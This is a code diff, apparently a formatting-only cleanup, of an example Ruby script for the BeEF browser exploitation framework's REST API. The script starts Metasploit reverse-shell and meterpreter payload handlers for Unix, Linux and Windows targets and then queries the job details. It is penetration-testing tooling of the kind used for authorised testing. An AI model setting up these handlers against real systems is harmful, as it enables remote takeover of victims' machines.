@@ -15,9 +15,9 @@ require './lib/beef_rest_api' # API
 
 if ARGV.length == 0
   puts "#{$0}:"
-  puts "|  Example BeEF RESTful API script"
-  puts "|  Use --help for help"
-  puts "|_ Use verbose mode (-v) and debug mode (-d) for more output"
+  puts '|  Example BeEF RESTful API script'
+  puts '|  Use --help for help'
+  puts '|_ Use verbose mode (-v) and debug mode (-d) for more output'
   exit 1
 end
 
@@ -73,10 +73,10 @@ print_status "Authenticating to: #{proto}://#{host}:#{port}"
 
 # Start payload handlers
 handlers = [
-  @api.msf_handler( {'PAYLOAD'=>'generic/shell_reverse_tcp', 'LPORT' => '6666', 'LHOST' => host} ),
-  @api.msf_handler( {'PAYLOAD'=>'cmd/unix/reverse', 'LPORT' => '6010', 'LHOST' => host} ),
-  @api.msf_handler( {'PAYLOAD'=>'linux/x86/meterpreter/reverse_tcp', 'LPORT' => '6020', 'LHOST'=> host} ),
-  @api.msf_handler( {'PAYLOAD'=>'windows/meterpreter/reverse_tcp', 'LPORT' => '6030', 'LHOST'=> host} )
+  @api.msf_handler({ 'PAYLOAD'=>'generic/shell_reverse_tcp', 'LPORT' => '6666', 'LHOST' => host }),
+  @api.msf_handler({ 'PAYLOAD'=>'cmd/unix/reverse', 'LPORT' => '6010', 'LHOST' => host }),
+  @api.msf_handler({ 'PAYLOAD'=>'linux/x86/meterpreter/reverse_tcp', 'LPORT' => '6020', 'LHOST'=> host }),
+  @api.msf_handler({ 'PAYLOAD'=>'windows/meterpreter/reverse_tcp', 'LPORT' => '6030', 'LHOST'=> host })
 ]
 
 # Retrieve msf jobs
@@ -86,6 +86,7 @@ print_debug jobs
 # Retrieve msf job details
 jobs.each do |job_id,job_name|
   next if job_id !~ /\A\d+\Z/
+
   print_status "Retrieving details for Metasploit job [id: #{job_id}] [#{job_name}]"
   details = @api.msf_job_info(job_id)
   print_debug details
